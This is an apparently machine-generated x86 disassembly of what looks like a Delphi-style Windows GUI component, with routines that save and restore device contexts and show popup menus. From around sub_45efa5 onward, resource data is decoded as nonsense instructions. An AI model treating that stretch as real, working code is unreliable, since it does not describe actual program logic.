jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a5d0
mov dx [ esi + 0x4 ]
call sub_45d7e8
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_423de4
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_45e866
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_45e849
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_424618
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_424494
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_45ecd8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e850
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_424618
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_45e048
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_45d748
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a5d0
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_45d748
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_45e9a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_423de4
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_45e984
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_45e967
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_424618
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_424494
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e96e
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_424618
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_4470c8
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46b508
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a5d0
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_45d748
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a5d0
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_45d748
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a5d0
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a5d0
mov cl [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_45d748
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a5d0
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a5d0
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_45d778
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a5d0
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a5d0
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_45d778
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_46b1ac
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_46b214
jmp r-xdata
sub_45e98b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_45ea44
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_41a474
pop esi
pop ebx
retn
push ebx
push sub_45e4b4
call sub_421110
mov [ ebx + 0x10 ] eax
sub_45ea88
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45d560
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_45ea44
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_45eafc
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_45ea6c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45d5fc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_45eb54
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_4598f8
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax ebx
call sub_45e268
mov [ ebx + 0x41 ] 0x1
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_45e268
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_45eb9c
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_4598f8
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_469cb0
mov edx eax
jmp r-xdata
mov si 0xffc8
call sub_403450
mov edx eax
jmp r-xdata
sub_45ebe8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_419174
mov eax [ esp ]
mov [ ebx + 0x58 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x5c ] eax
mov eax ebx
call sub_45eb54
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_45ceb4
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_45d3b0
mov eax [ ebx + 0x34 ]
call sub_45a758
mov eax ebx
call sub_45dd58
mov eax ebx
call sub_45eb9c
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x60 ]
mov bp [ eax + edx * 2 ]
xor eax eax
mov al [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
xor eax eax
mov al [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_45a888
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_45ec9c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41a5d0
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41a5d0
cmp ebp [ eax ]
jne r-xdata
sub_45ecd8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_423c94
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_4234a8
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_423c94
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_4234a8
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_403450
mov edx [ r-xdata ]
call sub_4033e0
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_423c94
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_4234a8
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_45edc0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_403ff8
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_404264
cmp ebx eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
mov ecx eax
and ecx 0xff
bt [ edx ] ecx
jae r-xdata
pop esi
pop ebx
retn
cmp al 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx 0x1
mov edx ebx
call sub_404504
cmp ebx 0x1
jle r-xdata
mov eax [ esi ]
call sub_404264
sub eax ebx
cmp eax 0x2
jl r-xdata
mov eax [ esi ]
cmp [ eax + ebx - 0x2 ] 0x28
jne r-xdata
mov eax [ esi ]
cmp [ eax + ebx + 0x1 ] 0x29
jne r-xdata
mov edx ebx
dec edx
mov eax esi
mov ecx 0x4
call sub_404504
jmp r-xdata
sub_45ee54
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_403fa4
mov ebx 0x1
mov eax esi
call sub_404264
mov edi eax
cmp edi ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
mov dl [ esi + ebx - 0x1 ]
call sub_40418c
sub_45eeb8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45ef11
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_45edc0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_45edc0
mov eax [ ebp - 0x8 ]
pop edx
call sub_4082d0
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ef18
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc8
retn
sub_45efa5
std
dec eax
add ah ch
add ecx [ ecx ]
in al dx
std
dec eax
add [ eax + 0x4 ] al
dec ecx
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_45f018
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f01f
retn
mov eax [ rw-data ]
call sub_403254
mov eax [ rw-data ]
call sub_403254
mov eax [ rw-data ]
call sub_403254
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404a58
mov eax rw-data
call sub_403fa4
sub_45f024
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403d50
mov eax [ r-xdata ]
call sub_419e0c
mov eax [ r-xdata ]
call sub_419eac
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419e58
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419e58
mov eax [ r-xdata ]
call sub_419d50
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b6c4
mov [ rw-data ] eax
sub_45f0e8
inc ebp
add [ ecx ] cl
jae r-xdata
add [ edi ] bl
push edx
jne r-xdata
inc [ ecx ]
add [ 0x6f6c6f43 ] al
jb r-xdata
outsd
inc esi
add [ ecx ] dl
inc ecx
add [ eax ] al
pop ds
popad
jb r-xdata
in al dx
jb r-xdata
sar [ ecx + esi * 8 + 0x45 ] 0x0
pop es
or dh [ ebx + 0x73 ]
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edx + 0x40 ] dl
add [ eax + eax ] ah
add bh bh
loopne r-xdata
push esp
inc ebx
outsd
outsb
je r-xdata
arpl [ ebx + 0x5 ] bp
inc esi
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x8 ] al
add al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
inc ecx
add [ esp + ebp * 4 - 0x534bffbf ] ch
jb r-xdata
inc esi
insb
popad
je r-xdata
inc esi
outsd
outsb
push ebx
imul edi [ edx + 0x65 ] sub_421698
sub [ eax ] al
add bh bh
and al 0x26
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax + eax ] 0x0
add [ eax ] al
or al [ edx + 0x75 ]
je r-xdata
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jl r-xdata
jae r-xdata
insb
inc edx
popad
jb r-xdata
adc [ eax ] al
sbb al [ eax ]
add bh bh
sbb al [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
push es
dec ebp
popad
jb r-xdata
inc ebp
add [ eax ] cl
add [ eax ] al
dec [ eax ]
add [ eax ] al
add [ ecx ] 0xd
add [ 0x6d726f46 ] al
jae r-xdata
int1
inc ebp
add ah ch
add [ eax ] al
insb
push ebx
arpl [ edx + 0x6f ] si
add eax 0x6d726f46
jae r-xdata
push ebx
insd
outsd
outsd
je r-xdata
outsb
je r-xdata
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
je r-xdata
inc ebp
add [ edi ] al
int1
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 8 + 0x45 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 8 + 0x45 ] ah
add [ eax ] cl
add [ eax ] al
js r-xdata
popad
outsb
add [ gs : bx + si ] dl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
imul ebp [ esi ] 0x2c004010
add [ eax ] al
inc [ eax + 0x26 ]
inc esi
insb
insb
inc edx
popad
jb r-xdata
dec eax
outsd
je r-xdata
add [ eax ] al
[ 0x1ff0000 ]
push esp
adc [ eax ] al
xor [ eax ] al
add bh bh
sbb al 0x27
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
add al 0x53
imul edi [ edx + 0x65 ] r-xdata
xor al 0x0
add bh bh
pushad
daa
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
add eax 0x6c797453
push esp
adc [ eax ] al
cmp [ eax ] al
add bh bh
js r-xdata
outsd
insb
outsd
jb r-xdata
inc edx
popad
jb r-xdata
inc ecx
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
pushfd
stosd [ edi ]
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
mov al 0x34
inc eax
add [ eax ] bl
jecxz r-xdata
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax - 0xd ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or [ eax + ebp * 2 + 0x75 ] edx
insd
bound edx [ ebx + 0x69 ]
jpe r-xdata
pop es
add [ esi ] al
add [ eax ] al
adc [ eax ] al
or al 0x0
add bh bh
pop eax
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x6f500800
jae r-xdata
outsb
arpl [ ebx ] ax
add [ eax ] eax
add [ eax ] al
add [ edx + edx + 0x45 ] ch
add ah bh
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + ebp + 0x46 ] ch
adc al [ ebp ]
loopne r-xdata
dec esi
outsd
jb r-xdata
inc ebp
add [ eax ] cl
ja r-xdata
add [ eax ] dl
inc eax
add [ 0x1dff0000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
je r-xdata
push esi
jb r-xdata
outsd
insb
nop
or ch dh
xor al 0x7
inc edx
xchg edx eax
inc esp
add [ eax - 0x5fffbaf8 ] al
or [ ebp ] al
add [ 0xffffffff92440045 ] 0x44
add [ eax - 0x6e ] cl
inc esp
add [ edx + eax * 8 + 0x44 ] al
add [ eax - 0x3e ] dh
inc esp
add [ eax - 0x3fffbb63 ] cl
xchg ebx eax
inc esp
add [ edi + ebx * 4 ] dl
inc esp
add [ esi + ebx * 4 - 0x5e5fffbc ] cl
inc esp
add [ eax + 0x44 ] cl
add [ ecx - 0x3d0bffbc ] dh
inc esp
add [ esi + eax ] cl
inc ebp
add al cl
push es
inc ebp
add [ ecx + eax + 0x6ac0045 ] cl
inc ebp
add [ ecx + esi ] ah
inc esi
add al bh
sub al [ esi ]
inc eax
fadd [ eax + eax - 0x58 ]
sub al [ esi ]
sub cl bl
inc esp
add [ eax - 0x27ffb9d6 ] bh
fadd [ eax + eax - 0x24 ]
fadd [ eax + eax - 0x6c ]
fild [ eax + eax + 0x3c ]
fild [ eax + eax - 0x14 ]
pop es
inc ebp
add [ ebp + 0x19e00044 ] al
inc ebp
add [ eax ] dh
add al 0x45
add [ eax + 0x7 ] bl
inc ebp
add [ eax ] bl
sub eax [ esi ]
enter 0x462d 0x0
cld
das
inc esi
add [ esi ] al
add [ 0x15011400 ] al
add [ eax + esi * 4 ] edi
in al dx
inc eax
inc [ eax ]
xor [ esi ] al
fdiv [ eax ]
inc esi
add [ eax ] al
xor [ esi ] eax
xchg esp eax
xor [ esi ] eax
fsubr [ edi ]
inc esi
add [ eax ] bh
sub eax [ esi ]
adc al 0x54
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
inc esp
add al cl
stosd [ edi ]
inc ecx
add [ eax + eax * 8 + 0x44 ] dh
add [ eax - 0x6bffbb6c ] cl
mov [ eax + eax - 0x60 ] 0x4c00449d
add al dh
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
jmp [ eax + 0x27 ]
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
outsd
outsb
push esp
adc [ eax ] al
adc [ eax ] al
add bh bh
test al 0x27
inc esi
add [ edi + 0x46 ] bh
add [ eax ] al
push es
add [ 0x676e6152 ] al
add [ gs : eax ] dl
add [ ebx ] al
or al 0x54
inc edx
outsd
jb r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
jb r-xdata
outsd
insb
hlt
pop es
mov [ esp + eax * 2 + 0x44c79400 ] dl
add [ eax + 0x4c00449d ] ah
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
add [ edx + ebp + 0x46 ] ch
add al dh
adc al [ ebp ]
loopne r-xdata
jb r-xdata
inc ebp
add [ edi ] al
adc al 0x54
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
cmc
cmc
inc ebp
add [ ebx ] al
adc [ esi + eax * 2 + 0x6f ] dl
jb r-xdata
jb r-xdata
je r-xdata
inc edx
add [ esp + eax ] dh
inc edx
add [ esp + eax ] ch
inc edx
add [ edi + eax + 0x42 ] dl
add ah dh
sub [ esi ] eax
add al 0xe
inc ebp
add [ eax ] ah
adc eax [ ebp ]
insb
adc al [ ebp ]
cld
jae r-xdata
xor al 0x7
inc esp
add al cl
stosd [ edi ]
inc ecx
add [ eax + eax * 8 + 0x44 ] dh
add [ eax - 0x6bffbb6c ] cl
add [ eax ] bl
jecxz r-xdata
xor al 0x40
je r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x50045f5 ] al
inc esi
outsd
inc edx
outsd
jb r-xdata
or [ edx ] dh
inc eax
jae r-xdata
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
mov al 0x34
inc eax
lea eax [ eax ]
pop esp
test [ ebp ] 0x0
insb
add [ gs : eax ] eax
add [ eax ] al
add [ 0xffffffff80000000 ] al
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
enter 0x4627 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ ebx + esi * 8 + 0x45 ] ah
add [ ebx ] al
or al 0x54
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
shl ah 0xf3
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
cmc
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
hlt
xchg edx eax
inc esp
add [ eax - 0x5fffbaf8 ] al
or [ ebp ] al
add [ 0xffffffff92440045 ] 0x44
add [ eax - 0x6e ] cl
inc esp
add [ edx + eax * 8 + 0x44 ] al
add [ eax - 0x3e ] dh
inc esp
add [ eax - 0x3fffbb63 ] cl
xchg ebx eax
inc esp
add [ edi + ebx * 4 ] dl
inc esp
add [ esi + ebx * 4 - 0x5e5fffbc ] cl
inc esp
add [ eax + 0x44 ] cl
add [ ecx - 0x3d0bffbc ] dh
inc esp
add [ edx + edx + 0x45 ] ch
add ah bh
add ah ch
xor [ eax ] eax
add [ eax ] dl
add al [ eax ]
push [ esp + ebp + 0x46 ]
insb
insb
inc edx
outsd
js r-xdata
mov [ eax + eax - 0x60 ] 0x4c00449d
pop es
inc edx
add [ esp + eax ] dh
inc edx
add [ esp + eax ] ch
inc edx
add [ edi + eax + 0x42 ] dl
add [ edx + esi ] ah
inc esi
add [ esi + ecx ] al
inc ebp
add [ eax ] ah
adc eax [ ebp ]
insb
adc al [ ebp ]
cld
jae r-xdata
jb r-xdata
bound esi [ ebx + 0x53 ]
cmc
inc ebp
jb r-xdata
imul edi [ edx + 0x65 ] 0x656c6261
or [ edx + 0x73 ] ah
inc esp
imul esp [ ecx + 0x6c ] 0x620c676f
jae r-xdata
or al 0x5c
outsd
push ebx
arpl [ edx + 0x6f ] si
insb
insb
add [ eax ] dl
inc eax
add [ esi + eax ] cl
inc ebp
add al cl
push es
inc ebp
add [ ecx + eax + 0x6ac0045 ] cl
inc ebp
add [ ecx + esi ] ah
inc esi
add al bh
sub al [ esi ]
inc eax
fadd [ eax + eax - 0x7c ]
xor al [ esi ]
sub cl bl
inc esp
add [ eax - 0x27ffb9d6 ] bh
fadd [ eax + eax - 0x24 ]
fadd [ eax + eax - 0x6c ]
fild [ eax + eax + 0x3c ]
fild [ eax + eax - 0x14 ]
pop es
inc ebp
add [ ebp + 0x19e00044 ] al
inc ebp
add [ eax ] dh
add al 0x45
add [ eax + 0x7 ] bl
inc ebp
add [ eax ] bl
sub eax [ esi ]
enter 0x462d 0x0
cld
das
inc esi
add [ edx ] al
add [ eax + eax + 0x32e8b010 ] al
inc esi
add al dh
xor al [ esi ]
or dl [ ebx + edx * 2 + 0x63 ]
jb r-xdata
inc eax
add [ eax - 0x9 ] dl
inc ebp
add [ edi ] al
or dl [ ebx + edx * 2 + 0x63 ]
jb r-xdata
cmc
inc ebp
add [ esi ] al
bound esi [ ebx + 0x4e ]
outsd
outsb
or [ gs : edx + 0x73 ] ah
push ebx
imul ebp [ esi + 0x67 ] 0x620a656c
jae r-xdata
add eax 0x80000000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ esi + esi * 8 + 0x45 ] bl
add [ eax ] al
add [ eax - 0x9 ] dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
outsd
insb
